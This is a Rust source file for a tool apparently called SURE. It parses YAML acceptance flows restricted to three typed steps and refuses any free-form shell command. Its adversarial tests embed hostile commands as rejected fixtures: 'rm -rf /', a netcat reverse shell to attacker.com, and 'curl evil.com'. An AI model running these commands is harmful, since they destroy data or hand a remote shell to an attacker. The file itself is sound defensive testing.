//! A safe local acceptance flow described without arbitrary shell.
//!
//! `P5-T005`'s acceptance, and it is one sentence:
//!
//! > *A project/fixture can describe safe local acceptance flows without
//! > arbitrary free-form shell.*
//!
//! # What "without arbitrary free-form shell" means at the type level
//!
//! [`FlowStep`] has three variants and no field that accepts a command string.
//! A caller who wants to say *start the project* names a [`ScriptRole`] and a
//! component, and the command is derived from the manifest by the same rule
//! [`crate::runtime_probes`] uses — not taken from the caller. A caller who
//! wants to say *ask this route* names the path and the port, and the request
//! line is built by [`crate::probe::Endpoint`], which refuses anything that is
//! not loopback and not a safe request-target. **There is no door a caller can
//! open that leads to [`ActionKind::ArbitraryCommand`]**: the enum has no
//! variant for it, and the structs inside the variants carry
//! `#[serde(deny_unknown_fields)]`, so a YAML document that tries to slip a
//! `command:` key in beside the typed ones is refused at parse time rather than
//! ignored.
//!
//! # The three steps, and why there are only three
//!
//! - [`StartService`](FlowStep::StartService) — [`ActionKind::StartService`],
//!   the same action [`crate::runtime_probes`] plans for a `start` or `dev`
//!   script. The weight is [`MustFix`](Severity::MustFix), critical,
//!   [`ObservedFact`](EvidenceClass::ObservedFact), because a project that
//!   declares how to start itself and does not start is a project that does not
//!   run.
//! - [`ProbeRoute`](FlowStep::ProbeRoute) — [`ActionKind::LocalProbe`], the
//!   same action [`crate::http_routes::RouteCheck`] uses. The weight is the
//!   same as a route check's: `MustFix`, critical, `ObservedFact`.
//! - [`BrowserProbe`](FlowStep::BrowserProbe) — [`ActionKind::BrowserProbe`],
//!   the same action [`crate::runtime_probes`] plans for an interface probe.
//!   The weight is [`ShouldFixFirst`](Severity::ShouldFixFirst), not critical,
//!   `ObservedFact`, for the same reason an interface probe is not critical:
//!   a browser probe's failure modes include ones SURE cannot tell from a real
//!   defect.
//!
//! **The absence of a fourth step is a boundary, not a gap.** A flow that needs
//! to install dependencies, run the test suite, or write a file is not an
//! acceptance flow in the sense this module is built for — it is a build or a
//! test, and those have their own proposers. A flow that needs an arbitrary
//! command is exactly what the acceptance says cannot be represented.
//!
//! # How a step becomes a proposal
//!
//! [`CoreFlow::expand`] is the only way, and it takes a [`FlowContext`] rather
//! than a project root: a flow whose component does not exist in the graph, or
//! whose route was not read from the project's source, is refused rather than
//! repaired. The refusal is [`FlowRefused`], and each variant names the thing
//! that was wrong so a report can say why a flow produced no checks.
//!
//! **The proposals carry the same actions, severities, evidence classes and
//! reasons as the checks they parallel**, which is what makes them schedulable
//! by [`PlanBuilder`](crate::schedule::PlanBuilder) without that module
//! knowing this one exists. The identifier is built from the flow name and the
//! step index, so two flows with different names do not collide, and a flow
//! whose steps change order produces different identifiers — which is correct,
//! because the order is part of what the flow claims.
//!
//! # What this does not do
//!
//! **It does not run anything.** The expansion produces declarations, and the
//! running is [`crate::service`]'s, [`crate::probe`]'s and
//! [`crate::browser_driver`]'s work.
//!
//! **It does not decide whether a check is allowed to run.** That is
//! [`PlanBuilder`]'s, and through it [`decide`](sure_domain::execution::decide).
//!
//! **It does not read a flow from `sure.yaml` yet.** The YAML loader is for
//! fixtures and test projects; wiring it into the config is a later task. The
//! shape is stable enough that doing so would be an addition, not a redesign.

use std::fmt;
use std::path::{Path, PathBuf};

use sure_domain::evidence::EvidenceClass;
use sure_domain::execution::ActionKind;
use sure_domain::severity::Severity;

use crate::checks::MissingKind;
use crate::checks::check_id;
use crate::checks::node::{Runner, command_for, components};
use crate::components::ComponentGraph;
use crate::discover::node::{NodeProject, ScriptRole};
use crate::http_routes::RouteReading;
use crate::schedule::{CheckProposal, CheckReason};

/// One safe local acceptance flow.
///
/// A name and an ordered list of steps. The name is part of every check
/// identifier this flow produces, so two flows with the same steps and
/// different names do not collide.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CoreFlow {
    name: String,
    steps: Vec<FlowStep>,
}

impl CoreFlow {
    /// Parse a flow from YAML text.
    ///
    /// # Errors
    ///
    /// [`FlowParseError::MalformedYaml`] if the text is not valid YAML or not
    /// the shape a flow expects, and [`FlowParseError::UnknownStep`] if a step
    /// names a kind this build does not recognise.
    pub fn from_yaml(text: &str) -> Result<Self, FlowParseError> {
        let raw: RawFlow =
            serde_yaml_ng::from_str(text).map_err(|error| FlowParseError::MalformedYaml {
                message: error.to_string(),
            })?;

        let mut steps = Vec::with_capacity(raw.steps.len());
        for (index, mapping) in raw.steps.into_iter().enumerate() {
            let raw_step = RawStep::from_mapping(mapping).map_err(|err| match err {
                FlowParseError::UnknownStep { kind, .. } => {
                    FlowParseError::UnknownStep { index, kind }
                }
                other => other,
            })?;
            let step =
                FlowStep::from_raw(raw_step).map_err(|kind| FlowParseError::UnknownStep {
                    index,
                    kind: kind.to_owned(),
                })?;
            steps.push(step);
        }

        Ok(Self {
            name: raw.name,
            steps,
        })
    }

    /// The flow's name.
    #[must_use]
    pub fn name(&self) -> &str {
        &self.name
    }

    /// The steps, in order.
    #[must_use]
    pub fn steps(&self) -> &[FlowStep] {
        &self.steps
    }

    /// Turn this flow into check proposals, given project context.
    ///
    /// Each step produces exactly one [`CheckProposal`], and the proposals are
    /// in the same order as the steps. A step that cannot be turned into a
    /// proposal — because its component does not exist, its role has no script,
    /// or its route was not declared — produces [`FlowRefused`] and nothing
    /// else.
    ///
    /// # Errors
    ///
    /// See [`FlowRefused`] for the three ways a step can be refused.
    pub fn expand(&self, ctx: &FlowContext<'_>) -> Result<Vec<CheckProposal>, FlowRefused> {
        let mut proposals = Vec::with_capacity(self.steps.len());
        let runner = Runner::of(&ctx.project.managers);

        for (index, step) in self.steps.iter().enumerate() {
            let proposal = step.propose(&self.name, index, ctx, runner)?;
            proposals.push(proposal);
        }

        Ok(proposals)
    }
}

/// One step in a flow.
///
/// Three variants, and the module documentation argues the absence of a
/// fourth. Each variant wraps a struct with `#[serde(deny_unknown_fields)]`,
/// so a YAML document that tries to add a `command:` key to any step is
/// refused at parse time.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FlowStep {
    /// Start a local service by component and script role.
    ///
    /// The command is derived from the manifest, not taken from the caller.
    StartService {
        /// The component directory, relative to the project root. Empty for the
        /// root itself.
        component: PathBuf,
        /// Which script role to look for in the component's manifest.
        role: ScriptRole,
    },
    /// Probe a known local HTTP route.
    ///
    /// The route must have been declared in the project's source, or the
    /// expansion refuses it.
    ProbeRoute {
        /// The path to ask for, exactly as the project declares it.
        path: String,
        /// The port to ask on.
        port: u16,
    },
    /// Drive a browser against a local path.
    BrowserProbe {
        /// The path to browse.
        path: String,
        /// The port the service is expected on.
        port: u16,
    },
}

impl FlowStep {
    /// Turn a raw step into a typed one.
    ///
    /// The error is the string that was not a recognised step kind.
    fn from_raw(raw: RawStep) -> Result<Self, &'static str> {
        match raw {
            RawStep::StartService(data) => {
                let role = parse_role(&data.role).ok_or("start_service")?;
                Ok(Self::StartService {
                    component: PathBuf::from(data.component),
                    role,
                })
            }
            RawStep::ProbeRoute(data) => Ok(Self::ProbeRoute {
                path: data.path,
                port: data.port,
            }),
            RawStep::BrowserProbe(data) => Ok(Self::BrowserProbe {
                path: data.path,
                port: data.port,
            }),
        }
    }

    /// Build the check proposal this step represents.
    fn propose(
        &self,
        flow_name: &str,
        index: usize,
        ctx: &FlowContext<'_>,
        runner: Runner,
    ) -> Result<CheckProposal, FlowRefused> {
        match self {
            Self::StartService { component, role } => {
                propose_start_service(flow_name, index, ctx, runner, component, *role)
            }
            Self::ProbeRoute { path, port } => {
                propose_probe_route(flow_name, index, ctx, path, *port)
            }
            Self::BrowserProbe { path, port } => {
                Ok(propose_browser_probe(flow_name, index, path, *port))
            }
        }
    }
}

/// The context a flow needs to expand itself into proposals.
///
/// Three references, each to the module that owns the fact: the component
/// graph for component existence, the project discovery for manifest reading,
/// and the route reading for route validation.
#[derive(Debug, Clone, Copy)]
pub struct FlowContext<'a> {
    /// The component graph, for looking up whether a component exists.
    pub graph: &'a ComponentGraph,
    /// The discovered Node project, for reading manifest scripts.
    pub project: &'a NodeProject,
    /// The routes read from the project's source, for validating route steps.
    pub routes: &'a RouteReading,
}

/// Why a flow could not be parsed from YAML.
///
/// Refused rather than repaired: a malformed document is not a document SURE
/// can guess the intent of, and an unknown step is a step this build does not
/// know how to turn into a check.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FlowParseError {
    /// The text is not valid YAML, or not the shape a flow expects.
    MalformedYaml {
        /// What the parser said.
        message: String,
    },
    /// A step names a kind this build does not recognise.
    UnknownStep {
        /// Which step, counting from zero.
        index: usize,
        /// The kind string that was not recognised.
        kind: String,
    },
}

impl fmt::Display for FlowParseError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::MalformedYaml { message } => {
                write!(f, "the flow document is not valid YAML: {message}")
            }
            Self::UnknownStep { index, kind } => {
                write!(
                    f,
                    "step {index} is `{kind}`, which is not a step kind this build recognises"
                )
            }
        }
    }
}

impl std::error::Error for FlowParseError {}

/// Why a flow step could not be turned into a check proposal.
///
/// Three ways, matching the three adversarial tests the acceptance names:
/// unknown action, shell string, and undeclared route. The first two are
/// caught at parse time and produce [`FlowParseError`]; this type is for the
/// third and for the component-level refusals that need project context.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FlowRefused {
    /// The component this step names is not in the graph.
    NoSuchComponent {
        /// The component path that was not found.
        component: String,
    },
    /// The manifest leaves SURE without a command for this role.
    NoCommandForRole {
        /// The component that was looked at.
        component: String,
        /// The role that was asked for.
        role: ScriptRole,
        /// Why the command is missing.
        reason: MissingKind,
    },
    /// The route this step names was not declared in the project's source.
    RouteNotDeclared {
        /// The path that was not found.
        path: String,
    },
}

impl fmt::Display for FlowRefused {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::NoSuchComponent { component } => {
                write!(
                    f,
                    "{} is not a component of this project",
                    crate::redact::escape_control_characters(component)
                )
            }
            Self::NoCommandForRole {
                component,
                role,
                reason,
            } => {
                write!(
                    f,
                    "{} has no command for `{}` ({})",
                    crate::redact::escape_control_characters(component),
                    role.conventional_name(),
                    reason.plain_explanation()
                )
            }
            Self::RouteNotDeclared { path } => {
                write!(
                    f,
                    "the route `{}` was not declared in the project's source",
                    crate::redact::escape_control_characters(path)
                )
            }
        }
    }
}

impl std::error::Error for FlowRefused {}

// ---------------------------------------------------------------------------
// Raw shapes for serde, kept private so the public types can be strict
// ---------------------------------------------------------------------------

/// The shape serde reads from YAML.
#[derive(Debug, Clone, PartialEq, Eq, serde::Deserialize)]
#[serde(deny_unknown_fields, rename_all = "snake_case")]
struct RawFlow {
    name: String,
    steps: Vec<serde_yaml_ng::Mapping>,
}

/// One step before validation.
///
/// Deserialised from a single-key mapping: the key is the step kind and the
/// value is the step's fields. `deny_unknown_fields` on each inner struct
/// refuses a key that does not belong — including a `command:` key, which is
/// how arbitrary shell is kept unrepresentable.
#[derive(Debug, Clone, PartialEq, Eq)]
enum RawStep {
    StartService(StartServiceData),
    ProbeRoute(ProbeRouteData),
    BrowserProbe(BrowserProbeData),
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Deserialize)]
#[serde(deny_unknown_fields, rename_all = "snake_case")]
struct StartServiceData {
    component: String,
    role: String,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Deserialize)]
#[serde(deny_unknown_fields, rename_all = "snake_case")]
struct ProbeRouteData {
    path: String,
    port: u16,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Deserialize)]
#[serde(deny_unknown_fields, rename_all = "snake_case")]
struct BrowserProbeData {
    path: String,
    port: u16,
}

impl RawStep {
    /// Parse a step from a YAML mapping that must contain exactly one key.
    fn from_mapping(mapping: serde_yaml_ng::Mapping) -> Result<Self, FlowParseError> {
        let mut iter = mapping.into_iter();
        let (key, value) = iter.next().ok_or_else(|| FlowParseError::MalformedYaml {
            message: "a step must be a single-key mapping, got 0 keys".to_owned(),
        })?;
        if iter.next().is_some() {
            return Err(FlowParseError::MalformedYaml {
                message: "a step must be a single-key mapping, got more than 1 key".to_owned(),
            });
        }
        let kind = key.as_str().ok_or_else(|| FlowParseError::MalformedYaml {
            message: "step kind must be a string".to_owned(),
        })?;

        match kind {
            "start_service" => {
                let data: StartServiceData = serde_yaml_ng::from_value(value).map_err(|error| {
                    FlowParseError::MalformedYaml {
                        message: format!("start_service: {error}"),
                    }
                })?;
                Ok(Self::StartService(data))
            }
            "probe_route" => {
                let data: ProbeRouteData = serde_yaml_ng::from_value(value).map_err(|error| {
                    FlowParseError::MalformedYaml {
                        message: format!("probe_route: {error}"),
                    }
                })?;
                Ok(Self::ProbeRoute(data))
            }
            "browser_probe" => {
                let data: BrowserProbeData = serde_yaml_ng::from_value(value).map_err(|error| {
                    FlowParseError::MalformedYaml {
                        message: format!("browser_probe: {error}"),
                    }
                })?;
                Ok(Self::BrowserProbe(data))
            }
            other => Err(FlowParseError::UnknownStep {
                index: 0,
                kind: other.to_owned(),
            }),
        }
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Match a role string against the conventional names SURE knows.
fn parse_role(text: &str) -> Option<ScriptRole> {
    ScriptRole::ALL
        .iter()
        .copied()
        .find(|role| role.conventional_name() == text)
}

/// The manifest path for a component directory.
///
/// `""` -> `"package.json"`, `"packages/web"` -> `"packages/web/package.json"`.
fn manifest_for_component(component: &Path) -> String {
    if component.as_os_str().is_empty() {
        crate::discover::node::MANIFEST.to_owned()
    } else {
        crate::scan::display_path(&component.join(crate::discover::node::MANIFEST))
    }
}

/// Format the title for a [`FlowStep::StartService`] check.
///
/// Escapes the flow name so attacker-controlled text cannot inject control
/// characters into a human-readable title.
fn start_service_title(flow_name: &str) -> String {
    format!(
        "start the project for flow `{}`",
        crate::redact::escape_control_characters(flow_name)
    )
}

/// Format the title for a [`FlowStep::ProbeRoute`] check.
///
/// Escapes both the path and the flow name so attacker-controlled text cannot
/// inject control characters into a human-readable title.
fn probe_route_title(path: &str, flow_name: &str) -> String {
    format!(
        "the route `GET {}` answers for flow `{}`",
        crate::redact::escape_control_characters(path),
        crate::redact::escape_control_characters(flow_name)
    )
}

/// Format the title for a [`FlowStep::BrowserProbe`] check.
///
/// Escapes the flow name so attacker-controlled text cannot inject control
/// characters into a human-readable title.
fn browser_probe_title(flow_name: &str) -> String {
    format!(
        "check the interface in a browser for flow `{}`",
        crate::redact::escape_control_characters(flow_name)
    )
}

/// Build a [`CheckProposal`] for a [`FlowStep::StartService`].
fn propose_start_service(
    flow_name: &str,
    index: usize,
    ctx: &FlowContext<'_>,
    runner: Runner,
    component: &Path,
    role: ScriptRole,
) -> Result<CheckProposal, FlowRefused> {
    let manifest = manifest_for_component(component);
    let directory = Path::new(&manifest)
        .parent()
        .unwrap_or_else(|| Path::new(""));

    let Some(_) = ctx.graph.get(directory) else {
        return Err(FlowRefused::NoSuchComponent {
            component: crate::scan::display_path(component),
        });
    };

    let package = components(ctx.project)
        .into_iter()
        .find(|(m, _)| m == &manifest)
        .map(|(_, p)| p)
        .ok_or_else(|| FlowRefused::NoSuchComponent {
            component: crate::scan::display_path(component),
        })?;

    let command =
        command_for(package, role, runner).map_err(|reason| FlowRefused::NoCommandForRole {
            component: crate::scan::display_path(component),
            role,
            reason,
        })?;

    let id = check_id(&manifest, &format!("flow{flow_name}{index}"));

    Ok(CheckProposal::new(
        id,
        start_service_title(flow_name),
        Severity::MustFix,
        true,
        EvidenceClass::ObservedFact,
        CheckReason::DeclaredCommand {
            declared_in: manifest.clone(),
            command,
        },
        &[ActionKind::StartService],
    ))
}

/// Build a [`CheckProposal`] for a [`FlowStep::ProbeRoute`].
fn propose_probe_route(
    flow_name: &str,
    index: usize,
    ctx: &FlowContext<'_>,
    path: &str,
    _port: u16,
) -> Result<CheckProposal, FlowRefused> {
    // Validate that the route was declared somewhere in the project source.
    let found = ctx
        .routes
        .checks()
        .iter()
        .any(|check| check.route().path() == path);
    if !found {
        return Err(FlowRefused::RouteNotDeclared {
            path: path.to_owned(),
        });
    }

    let id = check_id("flow", &format!("{flow_name}-probe-{index}-{path}"));

    Ok(CheckProposal::new(
        id,
        probe_route_title(path, flow_name),
        Severity::MustFix,
        true,
        EvidenceClass::ObservedFact,
        CheckReason::ProjectWide,
        &[ActionKind::LocalProbe],
    ))
}

/// Build a [`CheckProposal`] for a [`FlowStep::BrowserProbe`].
fn propose_browser_probe(flow_name: &str, index: usize, path: &str, _port: u16) -> CheckProposal {
    let id = check_id("flow", &format!("{flow_name}-browser-{index}-{path}"));

    CheckProposal::new(
        id,
        browser_probe_title(flow_name),
        Severity::ShouldFixFirst,
        false,
        EvidenceClass::ObservedFact,
        CheckReason::ProjectWide,
        &[ActionKind::BrowserProbe],
    )
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::*;

    use sure_domain::execution::{ExecutionMode, ExecutionPermissions};

    use crate::components::ComponentGraph;
    use crate::discover::DiscoverOptions;
    use crate::discover::Ecosystem;
    use crate::schedule::PlanBuilder;
    use std::sync::atomic::{AtomicU64, Ordering};

    static TEMP_COUNTER: AtomicU64 = AtomicU64::new(0);

    // -----------------------------------------------------------------------
    // Parse tests
    // -----------------------------------------------------------------------

    #[test]
    fn a_valid_flow_parses_from_yaml() {
        let yaml = r#"
name: smoke
steps:
  - start_service:
      component: ""
      role: start
  - probe_route:
      path: /health
      port: 3000
  - browser_probe:
      path: /
      port: 3000
"#;
        let flow = CoreFlow::from_yaml(yaml).unwrap();
        assert_eq!(flow.name(), "smoke");
        assert_eq!(flow.steps().len(), 3);
    }

    #[test]
    fn an_unknown_step_is_refused() {
        let yaml = r#"
name: bad
steps:
  - run_shell:
      command: "rm -rf /"
"#;
        let err = CoreFlow::from_yaml(yaml).unwrap_err();
        assert!(
            matches!(err, FlowParseError::UnknownStep { index: 0, kind } if kind == "run_shell")
        );
    }

    #[test]
    fn a_shell_command_is_unrepresentable() {
        // `deny_unknown_fields` on StartServiceData refuses the `command` key.
        let yaml = r#"
name: evil
steps:
  - start_service:
      component: ""
      role: start
      command: "rm -rf /"
"#;
        let err = CoreFlow::from_yaml(yaml).unwrap_err();
        assert!(matches!(err, FlowParseError::MalformedYaml { .. }));
        let msg = err.to_string();
        assert!(
            msg.contains("unknown field") || msg.contains("deny_unknown_fields"),
            "error should mention unknown field, got: {msg}"
        );
    }

    #[test]
    fn malformed_yaml_is_refused() {
        let yaml = "name: [";
        let err = CoreFlow::from_yaml(yaml).unwrap_err();
        assert!(matches!(err, FlowParseError::MalformedYaml { .. }));
    }

    // -----------------------------------------------------------------------
    // Expansion tests
    // -----------------------------------------------------------------------

    /// Create a temp directory with the given files, run discovery, and return
    /// the temp path and the discovery result.
    fn temp_discovery(
        package_json: &str,
        route_file: Option<&str>,
    ) -> (PathBuf, crate::discover::Discovery) {
        let temp = std::env::temp_dir().join(format!(
            "sure-core-flow-test-{}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_millis(),
            TEMP_COUNTER.fetch_add(1, Ordering::SeqCst),
        ));
        let _ = std::fs::remove_dir_all(&temp);
        std::fs::create_dir_all(&temp).unwrap();

        std::fs::write(temp.join("package.json"), package_json).unwrap();
        // A lockfile so the manager is agreed and commands can be derived.
        std::fs::write(temp.join("package-lock.json"), r#"{"lockfileVersion": 2}"#).unwrap();

        if let Some(content) = route_file {
            std::fs::write(temp.join("app.js"), content).unwrap();
        }

        let discovery = crate::discover::discover(&temp, &DiscoverOptions::default()).unwrap();
        (temp, discovery)
    }

    /// Extract the Node project from a discovery.
    fn node_project(discovery: &crate::discover::Discovery) -> &NodeProject {
        let report = discovery
            .report(Ecosystem::Node)
            .expect("node ecosystem should be present");
        match &report.findings {
            crate::discover::Findings::Node(proj) => proj,
            other => panic!("expected Node findings, got {other:?}"),
        }
    }

    #[test]
    fn start_service_expands_to_a_proposal() {
        let (_temp, discovery) = temp_discovery(
            r#"{"name": "fixture", "scripts": {"start": "node server.js"}}"#,
            None,
        );
        let project = node_project(&discovery);
        let graph = ComponentGraph::of(&discovery);
        let routes = RouteReading::of(&discovery);
        let ctx = FlowContext {
            graph: &graph,
            project,
            routes: &routes,
        };

        let yaml = r#"
name: smoke
steps:
  - start_service:
      component: ""
      role: start
"#;
        let flow = CoreFlow::from_yaml(yaml).unwrap();
        let proposals = flow.expand(&ctx).unwrap();
        assert_eq!(proposals.len(), 1);
        let proposal = &proposals[0];
        assert_eq!(
            proposal.requirements().actions(),
            &[ActionKind::StartService]
        );
        assert_eq!(proposal.severity(), Severity::MustFix);
        assert!(proposal.critical());
    }

    #[test]
    fn start_service_refuses_missing_component() {
        let (_temp, discovery) = temp_discovery(
            r#"{"name": "fixture", "scripts": {"start": "node server.js"}}"#,
            None,
        );
        let project = node_project(&discovery);
        let graph = ComponentGraph::of(&discovery);
        let routes = RouteReading::of(&discovery);
        let ctx = FlowContext {
            graph: &graph,
            project,
            routes: &routes,
        };

        let yaml = r#"
name: smoke
steps:
  - start_service:
      component: "packages/missing"
      role: start
"#;
        let flow = CoreFlow::from_yaml(yaml).unwrap();
        let err = flow.expand(&ctx).unwrap_err();
        assert!(matches!(err, FlowRefused::NoSuchComponent { .. }));
    }

    #[test]
    fn start_service_refuses_missing_command_for_role() {
        let (_temp, discovery) = temp_discovery(r#"{"name": "fixture", "scripts": {}}"#, None);
        let project = node_project(&discovery);
        let graph = ComponentGraph::of(&discovery);
        let routes = RouteReading::of(&discovery);
        let ctx = FlowContext {
            graph: &graph,
            project,
            routes: &routes,
        };

        let yaml = r#"
name: smoke
steps:
  - start_service:
      component: ""
      role: start
"#;
        let flow = CoreFlow::from_yaml(yaml).unwrap();
        let err = flow.expand(&ctx).unwrap_err();
        assert!(matches!(
            err,
            FlowRefused::NoCommandForRole {
                role: ScriptRole::Start,
                ..
            }
        ));
    }

    #[test]
    fn probe_route_expands_when_route_is_declared() {
        let (_temp, discovery) = temp_discovery(
            r#"{"name": "fixture", "scripts": {"start": "node server.js"}}"#,
            Some("const app = express();\napp.get('/health', (req, res) => res.send('ok'));\n"),
        );
        let project = node_project(&discovery);
        let graph = ComponentGraph::of(&discovery);
        let routes = RouteReading::of(&discovery);

        // Sanity: the route reading should have found our route.
        assert!(
            !routes.checks().is_empty(),
            "route reading should have found /health"
        );

        let ctx = FlowContext {
            graph: &graph,
            project,
            routes: &routes,
        };

        let yaml = r#"
name: smoke
steps:
  - probe_route:
      path: /health
      port: 3000
"#;
        let flow = CoreFlow::from_yaml(yaml).unwrap();
        let proposals = flow.expand(&ctx).unwrap();
        assert_eq!(proposals.len(), 1);
        assert_eq!(
            proposals[0].requirements().actions(),
            &[ActionKind::LocalProbe]
        );
    }

    #[test]
    fn probe_route_refuses_undeclared_route() {
        let (_temp, discovery) = temp_discovery(
            r#"{"name": "fixture", "scripts": {"start": "node server.js"}}"#,
            None,
        );
        let project = node_project(&discovery);
        let graph = ComponentGraph::of(&discovery);
        let routes = RouteReading::of(&discovery);
        let ctx = FlowContext {
            graph: &graph,
            project,
            routes: &routes,
        };

        let yaml = r#"
name: smoke
steps:
  - probe_route:
      path: /ghost
      port: 3000
"#;
        let flow = CoreFlow::from_yaml(yaml).unwrap();
        let err = flow.expand(&ctx).unwrap_err();
        assert!(matches!(
            err,
            FlowRefused::RouteNotDeclared { path } if path == "/ghost"
        ));
    }

    #[test]
    fn browser_probe_expands_to_a_proposal() {
        let (_temp, discovery) = temp_discovery(
            r#"{"name": "fixture", "scripts": {"start": "node server.js"}}"#,
            None,
        );
        let project = node_project(&discovery);
        let graph = ComponentGraph::of(&discovery);
        let routes = RouteReading::of(&discovery);
        let ctx = FlowContext {
            graph: &graph,
            project,
            routes: &routes,
        };

        let yaml = r#"
name: smoke
steps:
  - browser_probe:
      path: /
      port: 3000
"#;
        let flow = CoreFlow::from_yaml(yaml).unwrap();
        let proposals = flow.expand(&ctx).unwrap();
        assert_eq!(proposals.len(), 1);
        let proposal = &proposals[0];
        assert_eq!(
            proposal.requirements().actions(),
            &[ActionKind::BrowserProbe]
        );
        assert_eq!(proposal.severity(), Severity::ShouldFixFirst);
        assert!(!proposal.critical());
    }

    #[test]
    fn proposals_feed_into_plan_builder() {
        let (_temp, discovery) = temp_discovery(
            r#"{"name": "fixture", "scripts": {"start": "node server.js"}}"#,
            Some("const app = express();\napp.get('/health', (req, res) => res.send('ok'));\n"),
        );
        let project = node_project(&discovery);
        let graph = ComponentGraph::of(&discovery);
        let routes = RouteReading::of(&discovery);
        let ctx = FlowContext {
            graph: &graph,
            project,
            routes: &routes,
        };

        let yaml = r#"
name: e2e
steps:
  - start_service:
      component: ""
      role: start
  - probe_route:
      path: /health
      port: 3000
  - browser_probe:
      path: /
      port: 3000
"#;
        let flow = CoreFlow::from_yaml(yaml).unwrap();
        let proposals = flow.expand(&ctx).unwrap();

        let mut builder = PlanBuilder::new(
            ExecutionMode::HostConfirmed,
            ExecutionPermissions {
                inspect: true,
                run_project_code: true,
                install_dependencies: true,
                network: true,
                write_project: true,
                connect_service: true,
            },
        );
        for proposal in proposals {
            builder.propose(proposal).unwrap();
        }

        let schedule = builder.build();
        assert_eq!(schedule.checks().len(), 3);
    }

    #[test]
    fn adversarial_unknown_action_is_refused_at_parse_time() {
        let yaml = r#"
name: bad
steps:
  - deploy_to_production:
      region: us-east-1
"#;
        let err = CoreFlow::from_yaml(yaml).unwrap_err();
        assert!(
            matches!(err, FlowParseError::UnknownStep { index: 0, kind } if kind == "deploy_to_production")
        );
    }

    #[test]
    fn adversarial_shell_string_is_unrepresentable() {
        // `deny_unknown_fields` on every step struct means a `command` key
        // anywhere in a step causes a parse error.
        for yaml in [
            r#"
name: evil
steps:
  - start_service:
      component: ""
      role: start
      command: "nc -e /bin/sh attacker.com 9999"
"#,
            r#"
name: evil
steps:
  - probe_route:
      path: /health
      port: 3000
      command: "curl evil.com"
"#,
            r#"
name: evil
steps:
  - browser_probe:
      path: /
      port: 3000
      command: "open malware.html"
"#,
        ] {
            let err = CoreFlow::from_yaml(yaml).unwrap_err();
            assert!(
                matches!(err, FlowParseError::MalformedYaml { .. }),
                "shell string should be unrepresentable, got: {err}"
            );
        }
    }

    #[test]
    fn adversarial_undeclared_route_is_refused_at_expand_time() {
        let (_temp, discovery) = temp_discovery(
            r#"{"name": "fixture", "scripts": {"start": "node server.js"}}"#,
            None,
        );
        let project = node_project(&discovery);
        let graph = ComponentGraph::of(&discovery);
        let routes = RouteReading::of(&discovery);
        let ctx = FlowContext {
            graph: &graph,
            project,
            routes: &routes,
        };

        let yaml = r#"
name: smoke
steps:
  - probe_route:
      path: /not-declared-anywhere
      port: 3000
"#;
        let flow = CoreFlow::from_yaml(yaml).unwrap();
        let err = flow.expand(&ctx).unwrap_err();
        assert!(matches!(err, FlowRefused::RouteNotDeclared { .. }));
    }

    #[test]
    fn titles_escape_control_characters_in_flow_names_and_paths() {
        let name_with_newline = "evil\nflow";
        let path_with_tab = "/bad\tpath";
        let path_with_escape = "/x\u{1b}[2Ky";

        assert_eq!(
            start_service_title(name_with_newline),
            "start the project for flow `evil\\nflow`"
        );
        assert_eq!(
            probe_route_title(path_with_tab, name_with_newline),
            "the route `GET /bad\\tpath` answers for flow `evil\\nflow`"
        );
        assert_eq!(
            probe_route_title(path_with_escape, "normal"),
            "the route `GET /x\\u{001b}[2Ky` answers for flow `normal`"
        );
        assert_eq!(
            browser_probe_title(name_with_newline),
            "check the interface in a browser for flow `evil\\nflow`"
        );
    }

    #[test]
    fn refusal_messages_escape_attacker_controlled_text() {
        let no_component = FlowRefused::NoSuchComponent {
            component: "evil\ncomponent".to_owned(),
        };
        assert!(no_component.to_string().contains("evil\\ncomponent"));
        assert!(!no_component.to_string().contains("evil\ncomponent"));

        let no_command = FlowRefused::NoCommandForRole {
            component: "bad\tcomponent".to_owned(),
            role: ScriptRole::Start,
            reason: MissingKind::NotDeclared,
        };
        assert!(no_command.to_string().contains("bad\\tcomponent"));
        assert!(!no_command.to_string().contains("bad\tcomponent"));

        let no_route = FlowRefused::RouteNotDeclared {
            path: "/evil\npath".to_owned(),
        };
        assert!(no_route.to_string().contains("/evil\\npath"));
        assert!(!no_route.to_string().contains("/evil\npath"));
    }
}
